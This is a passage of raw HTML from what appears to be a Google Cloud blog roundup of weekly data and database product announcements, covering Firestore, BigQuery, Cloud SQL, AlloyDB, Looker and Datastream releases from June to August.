href=\"https://cloud.google.com/blog/products/databases/firestore-with-mongodb-compatibility-is-now-ga\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Firestore with MongoDB compatibility is now generally available (GA)</strong></a><strong style=\"vertical-align: baseline;\"> </strong>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Developers can now build cost-effective, scalable, and highly reliable apps on Firestore's serverless database using a familiar MongoDB-compatible API. With the general availability of Firestore with MongoDB compatibility, the 600,000 active developers within the Firestore community can now use existing MongoDB application code, drivers, and tools, as well as the open-source MongoDB ecosystem, with Firestore's serverless service. Firestore offers benefits like multi-region replication, virtually unlimited scalability, up to 99.999% SLA, single-digit millisecond read performance, integrated Google Cloud governance, and pay-as-you-go pricing. </span></li>\n<li><a href=\"https://cloudonair.withgoogle.com/events/firestore-compatibility-in-action?utm_source=twitter&amp;utm_medium=unpaidsoc&amp;utm_campaign=fy25q3-googlecloudtech-web-data-in_feed-no-brand-global&amp;utm_content=-&amp;utm_term=-&amp;linkId=16456513\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Register now</strong><span style=\"text-decoration: underline; vertical-align: baseline;\"> </span></a><span style=\"vertical-align: baseline;\">for an exciting  webinar on September 9th for a deep dive into Firestore with MongoDB compatibility and see live demos. </span></li>\n</ul>\n</li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><a href=\"https://cloud.google.com/database-migration?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Database Migration Service (DMS)</span></a><span style=\"vertical-align: baseline;\"> offers support for </span><a href=\"https://cloud.google.com/vpc/docs/private-service-connect\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Private Service Connect (PSC) interfaces</span></a><span style=\"vertical-align: baseline;\"> for homogenous migrations to Cloud SQL (</span><a href=\"https://cloud.google.com/database-migration/docs/postgres/configure-connectivity-vpc-peering#psc-interfaces\"><span style=\"text-decoration: underline; vertical-align: baseline;\">PSCi support doc</span></a><span style=\"vertical-align: baseline;\">)  and AlloyDB (</span><a href=\"https://cloud.google.com/database-migration/docs/postgres/configure-connectivity-vpc-peering#psc-interfaces\"><span style=\"text-decoration: underline; vertical-align: baseline;\">PSCi support doc</span></a><span style=\"vertical-align: baseline;\">). This capability is now generally available (GA). </span></span></span></li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">August 18 - August 22</span></span></h3>\n<ul>\n<li><strong><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Simplify Data Ingestion with the Revamped BigQuery \"Add Data\" Experience</span></span></strong>\n<ul>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">We're excited to announce the general availability of a completely redesigned \"Add Data\" experience in BigQuery, built to streamline how you bring data in for analysis.</span></span></li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">To enhance the user journey, we focused on simplifying the process of choosing from the many powerful ingestion methods BigQuery supports, from batch and streaming to CDC. Our goal was to create a more intuitive path for discovering data sources and provide clearer guidance on selecting the right tool for any given task.</span></span></li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">The new \"Add Data\" experience achieves this with a single, unified starting point within BigQuery Studio. It brings together all the ways to get data into BigQuery—including Data Transfer Service, Datastream, Dataflow, and partner solutions—into one intuitive interface. The experience guides you with clear categorization, solution recommendations, and in-context documentation to help you make informed choices. Now you can easily discover and configure the right data pipeline for your needs without leaving the BigQuery console.</span></span></li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Get started by clicking the <strong>\"+ Add data\"</strong> button in the BigQuery Explorer pane today. <a href=\"https://cloud.google.com/bigquery/docs/loading-data\">Learn more in the official documentation</a>.</span></span></li>\n</ul>\n</li>\n<li><strong><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><a href=\"https://cloud.google.com/sql\">Cloud SQL</a> now supports Private Service Connect (PSC) outbound connectivity</span></span></strong>\n<ul>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">With PSC outbound connectivity, customers can attach a PSC interface to their existing Cloud SQL PSC-enabled instances to allow their instances to make outbound connections to their network. This is required for <a href=\"https://cloud.google.com/database-migration/docs/homogeneous-migrations\">homogeneous migrations using Database Migration Service</a>. For more information, see <a href=\"https://cloud.google.com/sql/docs/mysql/about-private-service-connect#psc-outbound\">PSC outbound connections</a>.</span></span></li>\n</ul>\n</li>\n<li><strong><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">AI-Assisted Troubleshooting in <a href=\"https://cloud.google.com/sql/docs/editions-intro\">Cloud SQL Enterprise Plus</a></span></span></strong>\n<ul>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Cloud SQL for Enterprise Plus edition now offers enhanced </span><a href=\"https://cloud.google.com/sql/docs/mysql/observe-troubleshoot-with-ai\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI-assisted troubleshooting</span></a><span style=\"vertical-align: baseline;\">, guiding you through resolving complex database performance issues such as </span><a href=\"https://cloud.google.com/sql/docs/mysql/troubleshoot-slow-queries\"><span style=\"text-decoration: underline; vertical-align: baseline;\">slow queries</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://cloud.google.com/sql/docs/mysql/troubleshoot-high-database-load\"><span style=\"text-decoration: underline; vertical-align: baseline;\">high load</span></a><span style=\"vertical-align: baseline;\"> on your instances. This feature requires </span><a href=\"https://cloud.google.com/gemini/docs/cloud-assist/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Cloud Assist</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://cloud.google.com/sql/docs/mysql/using-query-insights#enable-insights\"><span style=\"text-decoration: underline; vertical-align: baseline;\">query insights</span></a><span style=\"vertical-align: baseline;\">, both available with the Enterprise Plus edition.</span></span></span></li>\n</ul>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">August 11 - August 15</span></span></h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Code Your Way to $15,000: The BigQuery AI Hackathon Starts Now -</strong><span style=\"vertical-align: baseline;\"> go beyond traditional analytics and build groundbreaking solutions using BigQuery's cutting-edge AI capabilities. This is your opportunity to solve real-world business problems using BigQuery’s Generative AI, Vector Search, and Multimodal capabilities. You’ll get hands-on experience with BigQuery’s newest features that bring AI directly to your data. SQL users will find these capabilities feel like a natural extension of their existing workflow, while Python practitioners can use BigQuery DataFrames to work using a familiar, pandas-like API. The goal is simple: build powerful, scalable AI solutions right where your data lives. </span><a href=\"https://www.kaggle.com/competitions/bigquery-ai-hackathon/overview\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Sign-up today</span></a><span style=\"vertical-align: baseline;\">!</span></li>\n<li><strong style=\"vertical-align: baseline;\">AlloyDB now supports PG 17 (17.5 minor version) in Preview</strong><span style=\"vertical-align: baseline;\"> - AlloyDB customers can now access the latest improved version of Postgres, alongside existing versions like PG16, PG15, and PG14. Customers will also be able to upgrade to PG17 through MVU APIs. The community released PG17 in September 2024, introducing numerous new features and improvements. These include enhanced query performance (materialized Common Table Expressions, incremental backups and improved logical replication), a better developer experience (enhancements to the JSON support) and numerous other </span><a href=\"https://www.postgresql.org/docs/release/17.0/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">improvements</span></a><span style=\"vertical-align: baseline;\">. </span></li>\n<li><strong style=\"vertical-align: baseline;\">Database Center now supports self-managed databases on GCE</strong><span style=\"vertical-align: baseline;\"> - </span><span style=\"vertical-align: baseline;\">Back in April, we announced the general availability of</span> <a href=\"https://cloud.google.com/blog/products/databases/database-center-is-now-generally-available?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Database Center</span></a><span style=\"vertical-align: baseline;\">, your AI-powered unified fleet management solution for Google Cloud databases including Cloud SQL, AlloyDB, Spanner, Bigtable, Memorystore, and Firestore. However, many of our customers continue to leverage the flexibility of running their Postgres, MySQL and SQL server databases on Google Compute Engine (GCE) VMs. So we're thrilled to announce that Database Center now extends its monitoring capabilities to these self-managed databases. Please sign-up </span><a href=\"https://docs.google.com/forms/d/1Icj8CA14QbdeqJz111vnAlnflMcUIqNRfCr7v3mUL7s/preview\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\"> to join this preview phase.</span></li>\n<li><a href=\"https://cloud.google.com/sql/docs/sqlserver/maintenance\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Near Zero Downtime (nZDT) for Cloud SQL Enterprise Plus edition for SQL Server</strong></a><strong style=\"vertical-align: baseline;\"> is now GA</strong><span style=\"vertical-align: baseline;\"> - With nZDT, maintenance and machine tier upgrades for Enterprise Plus SQL Server instances now experience sub-second downtime. This means:</span>\n<ul>\n<li><span style=\"vertical-align: baseline;\">99.99% SLA now includes maintenance downtime.</span></li>\n<li><span style=\"vertical-align: baseline;\">Customers can say goodbye to lengthy planning cycles for maintenance.</span></li>\n<li><span style=\"vertical-align: baseline;\">nZDT is now available across all three Cloud SQL engines - SQL Server, PostgreSQL and MySQL.</span></li>\n</ul>\n</li>\n<li><a href=\"https://cloud.google.com/firestore/native/docs/manage-databases#clone-database\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Database Clone Feature in Firestore launched in Public Preview</strong></a><span style=\"vertical-align: baseline;\"> - Firestore database cloning allows Firestore users to create a copy of their database. All the Firestore Documents data, as well as index definitions and entries, are copied over to a new database in the same project &amp; region with an appropriate user-chosen new database name. The user may choose to copy the state of the database from any snapshot time up to 7 days in the past.</span></li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><a href=\"https://cloud.google.com/resources/content/databases-customer-stories-2025?hl=en\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Build with Google Databases: 70+ Success Stories</strong></a><span style=\"vertical-align: baseline;\"> - This powerful resource highlights how over 70+ companies are using Google Cloud's fully managed database services to improve performance, scale globally, and optimize costs. It showcases real-world success stories across 10 industries, including retail, financial services, and technology.</span></span></span></li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">August 4 - August 8</span></span></h3>\n<ul>\n<li><a href=\"https://cloud.google.com/blog/products/data-analytics/new-agents-and-ai-foundations-for-data-teams\"><strong>Next Tokyo Data Cloud Announcements</strong></a>  - Google’s Data Cloud gives agents a complete, real-time understanding of your business, transforming it into a self-aware, reliable organization. We're delivering key innovations in three areas: 1) A new suite of data agents to act as expert partners, 2) An interconnected network for seamless agent collaboration, 3) A unified, AI-native foundation that unifies data and embeds AI-driven reasoning.</li>\n<li><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/ai-first-colab-notebooks-in-bigquery-and-vertex-ai\"><strong>AI-first Colab Enterprise experience in Vertex AI and BigQuery</strong></a>: This powerful platform streamlines complex data science workflows, allowing you to simply prompt an agent with a request like \"train a model to predict income.\" The agent then autonomously generates and executes a complete plan—from data loading and cleaning to model training and evaluation</li>\n<li><strong><a href=\"https://cloud.google.com/blog/products/databases/spanners-columnar-engine-unites-oltp-and-analytics\">Spanner Columnar Engine</a></strong>: Announcing the preview of the Spanner columnar engine, our latest innovation designed to turbocharge your data. By combining columnar storage and vectorized execution, we're making it possible to run lightning-fast analytical queries directly on your live operational data.</li>\n<li><strong><a href=\"https://cloud.google.com/blog/products/databases/introducing-enhanced-backups-for-cloud-sql\">Enhanced Backups for Cloud SQL</a></strong>: <span>Introducing Enhanced Backups for Google Cloud SQL, now with logically air-gapped and immutable backup vaults. Built with Google Cloud Backup and DR Service, this is your ultimate defense against modern threats.</span></li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">July 28 - August 1</span></span></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">AlloyDB Omni now supports Kubernetes Operator 1.5.0 and PostgreSQL ver. 16.8.0/15.12.0: </strong><span style=\"vertical-align: baseline;\">We have</span> <a href=\"https://cloud.google.com/alloydb/omni/current/docs/release-notes#July_23_2025\"><span style=\"text-decoration: underline; vertical-align: baseline;\">launched</span></a><span style=\"vertical-align: baseline;\"> AlloyDB Omni Operator 1.5.0 and database versions 16.8.0/15.12.0. This major release delivers a significant step forward in enterprise readiness, including support for OpenShift operations, high availability/disaster recovery, and critical operational improvements like low-downtime upgrades and backups from standby.</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">July 21 - July 25</span></span></h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Introducing partitioned index for BigQuery vector search: </strong><span style=\"vertical-align: baseline;\">When creating a </span><a href=\"https://cloud.google.com/bigquery/docs/vector-index\"><span style=\"text-decoration: underline; vertical-align: baseline;\">vector index</span></a><span style=\"vertical-align: baseline;\"> on a partitioned BigQuery table, you now have the option to also partition your vector index. Partitioning your vector index significantly reduces query costs and improves search accuracy for vector searches that utilize pre-filtering on the partitioning column.By partitioning your vector index, BigQuery can apply partition pruning to both your table and your vector index when you use a filter on the partitioning column in your vector search. This means BigQuery only scans the relevant partitions, decreasing I/O costs. Additionally, pre-filtering on the partitioning column makes your vector searches less likely to miss relevant results. This feature is particularly beneficial if most of your vector searches target specific partitions using pre-filters. You can only partition TreeAH vector indexes, and the PARTITION BY clause used for the vector index must match the one used for the original table. <a href=\"https://cloud.google.com/bigquery/docs/vector-index#partitions\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Read more</span></a><span style=\"vertical-align: baseline;\"> about the partitioned indexes in vector search.</span></span></li>\n<li><strong style=\"vertical-align: baseline;\">Datastream now supports BigLake Iceberg tables in BigQuery: </strong>Customers can now easily replicate data from different supported sources (<a href=\"https://cloud.google.com/datastream/docs/configure-your-source-mysql-database\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MySQL</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://cloud.google.com/datastream/docs/sources-postgresql\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Postgres</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://cloud.google.com/datastream/docs/sources-sqlserver\"><span style=\"text-decoration: underline; vertical-align: baseline;\">SQLserver</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://cloud.google.com/datastream/docs/sources-oracle\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Oracle</span></a><span style=\"vertical-align: baseline;\">,</span><a href=\"https://cloud.google.com/datastream/docs/sources-salesforce\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Salesforce</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://cloud.google.com/datastream/docs/sources-mongodb\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MongoDB</span></a><span style=\"vertical-align: baseline;\"> ) of Datastream into </span><a href=\"https://cloud.google.com/datastream/docs/destination-blmt\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigLake Managed Tables</span></a><span style=\"vertical-align: baseline;\"> for use cases spanning across open lakehouse, Enterprise grade storage for analytics, streaming and AI. Streaming to BigLake Iceberg tables lets you store data in a cost-effective way in the PARQUET format. By doing this, you can keep your data in a Cloud Storage bucket while using BigQuery for querying and analysis.</span></li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Cloud SQL Write Endpoint for Advanced DR: </strong><span style=\"vertical-align: baseline;\">Cloud SQL is excited to announce the GA of Write Endpoint to make Advanced Disaster Recovery (DR) seamless for customers (</span><a href=\"https://cloud.google.com/sql/docs/mysql/connect-to-instance-using-write-endpoint\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Documentation</span></a><span style=\"vertical-align: baseline;\">). This feature enhances application resilience during instance failovers and switchovers, ensuring customer applications remain connected to the primary instance without manual intervention.The write endpoint is now available in GA for MySQL and PostgreSQL instances of Enterprise Plus Edition. It already exists for SQL Server instances. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Vertical Scaling for Memorystore for Valkey and Memorystore for Redis Cluster: </strong><span style=\"vertical-align: baseline;\">Using </span><a href=\"https://cloud.google.com/memorystore/docs/cluster/scale-instance-capacity\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertical Scaling</span></a><span style=\"vertical-align: baseline;\">, Memorystore customers can now effortlessly scale their Memorystore nodes up or down ensuring optimal cluster sizing for varying workloads. Previously, node types were immutable post-deployment, hence customers only had the option for horizontal scaling (in and out) changing the number of shards in the cluster. </span></p>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Database Migration Service (DMS) supports migrations from SQL Server to AlloyDB for PostgreSQL in GA: </strong>Customers can now use DMS to migrate their databases from <a href=\"https://cloud.google.com/database-migration/docs/sqlserver-to-alloydb/scenario-overview?_gl=1*109toza*_ga*NzM3NjU1NjkwLjE3NTIwNzU4MTE.*_ga_4LYFWVHBEB*czE3NTI0MjE3MzYkbzEkZzEkdDE3NTI0MjIxNTAkajYwJGwwJGgw\"><span style=\"text-decoration: underline; vertical-align: baseline;\">SQL Server to AlloyDB for PostgreSQL</span></a><span style=\"vertical-align: baseline;\"> . This migration offers seamless experience, which offers a comprehensive SQL Server modernization framework with:</span>\n<ul>\n<li>Automatic database schema and code conversion</li>\n<li>Gemini augmented database code conversion</li>\n<li>Gemini assisted PostgreSQL training and code improvements</li>\n<li>Low-downtime, CDC based data movement</li>\n</ul>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">July 14 - July 18</span></span></h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Trust and security are central to Conversational Analytics</strong><span style=\"vertical-align: baseline;\">. Designed to gain the benefits of Google’s most capable AI models, Conversational Analytics offers a powerful and insightful natural language experience that is secure and trustworthy, meaning you can realize the full potential of generative AI with confidence, while keeping your data under control. Learn more </span><a href=\"https://cloud.google.com/blog/products/business-intelligence/understanding-looker-conversational-analytics-security\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Turn questions into queries with the Conversational Analytics API. </strong><span style=\"vertical-align: baseline;\">The Conversational Analytics API, now in preview, integrates multiple AI-powered tools to process user requests, including Natural Language to Query (NL2Query) and a Python code interpreter for generating responses, simplifying data science. Learn more </span><a href=\"https://cloud.google.com/blog/products/business-intelligence/use-conversational-analytics-api-for-natural-language-ai\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><strong style=\"vertical-align: baseline;\">Introducing BigQuery Soft Failover: Greater Control Over Disaster Recovery. </strong><span style=\"vertical-align: baseline;\">BigQuery now offers \"soft failover,\" giving administrators options over failover procedures. Unlike \"hard failover\" for unplanned outages, soft failover minimizes data loss for planned activities like disaster recovery drills or workload migrations. It initiates failover only after all data is replicated to the secondary region, guaranteeing data integrity. This feature is available via BigQuery UI, DDL, and CLI, providing enterprise-grade control for disaster recovery, confident simulations, and compliance without risking data. Learn more </span><a href=\"https://cloud.google.com/bigquery/docs/managed-disaster-recovery\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a>.<strong style=\"vertical-align: baseline;\"> </strong></span></span></li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">July 7 - July 11</span></span></h3>\n<ul>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><strong style=\"vertical-align: baseline;\">[Webinar] </strong><span style=\"vertical-align: baseline;\">Join us for a session on </span><a href=\"https://cloudonair.withgoogle.com/events/build-smart-apps-gen-ai-cloud-sql-observability-faster-dev\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">\"Build Smart Apps with Ease: Gen AI, Cloud SQL, and Observability for Faster Development.\" </span></a><span style=\"vertical-align: baseline;\">This webinar dives deep into mastering the essentials of building powerful Gen AI applications using Google Cloud technologies. Discover the complete Gen AI application development lifecycle, get a live demonstration of the new Application Design Center (ADC) for rapid app deployment, and explore its seamless integrations with frameworks like LangChain, LlamaIndex, and LangGraph. Plus, learn about the new MCP Toolbox for Databases to enhance the manageability and security of your GenAI agents, and understand critical operational considerations, including Cloud SQL Enterprise Plus features for performance, scalability, high availability, and disaster recovery.</span></span></span></li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">June 23 - June 27</span></span></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Looker developers gain speed and accuracy with debut of Continuous Integration.</strong><span style=\"vertical-align: baseline;\"> Continuous Integration for Looker helps streamline code development workflows, boost the end-user experience, and gives developers the confidence to deploy changes faster. Learn more </span><a href=\"https://cloud.google.com/blog/products/business-intelligence/introducing-continuous-integration-for-looker\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"><strong style=\"vertical-align: baseline;\">Code Interpreter brings advanced data science capabilities to Conversational Analytics. </strong><span style=\"vertical-align: baseline;\">Code Interpreter helps answer complicated questions, tapping into Python to perform advanced analysis on your Looker data.</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">Learn more </span><a href=\"https://www.googlecloudcommunity.com/gc/News-Announcements/Beyond-the-dashboard-Answering-your-toughest-data-questions-with/m-p/918718#M2152\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></span></span></li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">June 16 - June 20</span></span></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Standardize your business terminology with Dataplex business glossary.</strong><span style=\"vertical-align: baseline;\"> Want to standardize business terminologies and build a shared understanding across the enterprise? </span><a href=\"https://cloud.google.com/dataplex/docs/manage-glossaries\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Dataplex business glossary</span></a><span style=\"vertical-align: baseline;\"> is now GA within </span><a href=\"https://cloud.google.com/dataplex/docs/transition-to-dataplex-catalog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Dataplex Universal Catalog</span></a><span style=\"vertical-align: baseline;\">, providing a central, trusted vocabulary for your data assets, streamlining data discovery, and reducing ambiguity — leading to more accurate analysis, better governance, and faster insights. Learn more </span><a href=\"https://cloud.google.com/blog/products/data-analytics/dataplex-business-glossary-now-ga?e=48754805?utm_source%3Dcgc-blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Looker Core on Google Cloud is now FedRAMP High authorized.  </strong><span style=\"vertical-align: baseline;\">The need to protect highly sensitive government data is a top priority. Looker Core on Google Cloud enables users to explore and chat with their data via AI agents using natural language, and create dashboards and self-service reports. Learn more </span><a href=\"https://cloud.google.com/blog/topics/public-sector/accelerating-innovation-with-agent-assist-looker-google-cloud-core-and-vertex-ai-vector-search-now-fedramp-high-authorized/\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li><span style=\"vertical-align: baseline;\"><strong><span style=\"vertical-align: baseline;\">Fast Dev Mode Transition Speeds Looker Developers.</span></strong><span style=\"vertical-align: baseline;\"> A new Labs feature, Fast Dev Mode Transition, improves the performance of Development Mode on your Looker instance by loading LookML projects in read-only mode until a developer clicks the Create Developer Copy button for the project. Learn more </span><a href=\"https://cloud.google.com/looker/docs/admin-panel-general-labs#fast_dev_mode_transition\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></span></li>\n<li><a href=\"https://cloud.google.com/datastream\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Datastream</strong></a><strong style=\"vertical-align: baseline;\"> now supports MongoDB as a Source (in Public Preview)</strong><span style=\"vertical-align: baseline;\">: </span><span style=\"vertical-align: baseline;\">You can now easily replicate data from </span><a href=\"https://cloud.google.com/datastream/docs/sources-mongodb#:~:text=Datastream%20supports%20replicating%20change%20events,This%20page%20contains%20information%20about:\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MongoDB source</span></a><span style=\"vertical-align: baseline;\"> into </span><a href=\"https://cloud.google.com/bigquery\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery</span></a><span style=\"vertical-align: baseline;\"> and  </span><a href=\"https://cloud.google.com/storage\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Storage</span></a><span style=\"vertical-align: baseline;\">  for advanced analytics, reporting, and to power generative AI applications. Datastream offers MongoDB connectivity for both Replica Sets and Sharded Clusters. This includes support for self-managed MongoDB deployments as well as the fully managed</span><a href=\"https://www.mongodb.com/products/platform/atlas-database\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\"> AtlasDB</span></a><span style=\"vertical-align: baseline;\"> service.</span></li>\n<li><span style=\"vertical-align: baseline;\"> </span><strong style=\"vertical-align: baseline;\">Private Service Connect (PSC) on existing Cloud SQL instances (GA): </strong><a href=\"https://cloud.google.com/sql\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud SQL</span></a><span style=\"vertical-align: baseline;\"> now offers the ability to enable </span><a href=\"https://cloud.google.com/sql/docs/postgres/configure-private-services-access-and-private-service-connect\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Private Service Connect (PSC)</span></a><span style=\"vertical-align: baseline;\"> on existing instances that currently utilize Private Service Access (PSA). This new functionality, generally available for PostgreSQL, MySQL, and SQL Server engines, eliminates the previous requirement of creating new instances for PSC adoption. Customers can now transition their existing PSA instances to PSC without data migration. </span></li>\n<li><strong style=\"vertical-align: baseline;\">Cloud SQL for SQL Server - E+ Recommender: </strong><span style=\"vertical-align: baseline;\">The Enterprise Plus </span><a href=\"https://cloud.google.com/recommender/docs/recommenders\"><span style=\"text-decoration: underline; vertical-align: baseline;\">recommender</span></a><span style=\"vertical-align: baseline;\"> helps customers identify SQL Server instances that would benefit from an upgrade to the Cloud SQL Enterprise Plus Edition. It offers insights into current performance metrics, and emphasizes how Enterprise Plus features (such as the data cache and memory-optimized machines) can boost performance. Additionally, the recommender includes a convenient button for direct navigation to the instance settings page, enabling users to perform the upgrade easily. </span></li>\n<li><span style=\"vertical-align: baseline;\"><a href=\"https://cloud.google.com/alloydb/docs/about-private-service-connect\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">AlloyDB - PSC Service Automation</strong></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">With this launch, </span><a href=\"https://cloud.google.com/products/alloydb\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AlloyDB</span></a><span style=\"vertical-align: baseline;\"> significantly improves the </span><a href=\"https://cloud.google.com/alloydb/docs/configure-private-service-connect\"><span style=\"text-decoration: underline; vertical-align: baseline;\">connectivity configuration</span></a><span style=\"vertical-align: baseline;\"> experience for Private Service Connect (PSC), by automatically creating PSC endpoints in the customer VPC and exposing the IP address of the endpoint directly through the AlloyDB API, enabling seamless PSC adoption at scale.</span></span></li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">June 9 - June 13</strong></h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Introducing Pub/Sub Single Message Transforms (SMTs)</strong><span style=\"vertical-align: baseline;\">, to make it easy to perform simple data transformations such as validate, filter, enrich, and alter individual messages </span><span style=\"vertical-align: baseline;\">as they move in real time </span><span style=\"vertical-align: baseline;\">right within Pub/Sub</span><span style=\"vertical-align: baseline;\">. The first SMT is available now: JavaScript User-Defined Functions (UDFs), which allows you to perform simple, lightweight modifications to message attributes and/or the data directly within Pub/Sub via snippets of JavaScript code.</span><span style=\"vertical-align: baseline;\"> Learn more in the </span><a href=\"https://cloud.google.com/blog/products/data-analytics/pub-sub-single-message-transforms\"><span style=\"text-decoration: underline; vertical-align: baseline;\">launch blog</span></a><span style=\"vertical-align: baseline;\">. </span></li>\n<li><strong style=\"vertical-align: baseline;\">Serverless Spark is now generally available directly within BigQuery.</strong><span style=\"vertical-align: baseline;\"> Formerly Dataproc Serverless, the fully managed </span><a href=\"https://cloud.google.com/products/serverless-spark\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Serverless for Apache Spark</strong></a><span style=\"vertical-align: baseline;\"> helps to reduce TCO, provides strong performance with the new Lightning Engine, integrates and leverages AI, and is enterprise-ready. And by bringing Apache Spark directly into </span><a href=\"https://cloud.google.com/bigquery\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery</span></a><span style=\"vertical-align: baseline;\">, you can now develop, run and deploy Spark code interactively in BigQuery Studio. Read all about it </span><a href=\"https://cloud.google.com/blog/products/data-analytics/introducing-google-cloud-serverless-for-apache-spark-in-bigquery\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">. </span></li>\n<li><strong style=\"vertical-align: baseline;\">Next-Gen data pipelines: </strong><a 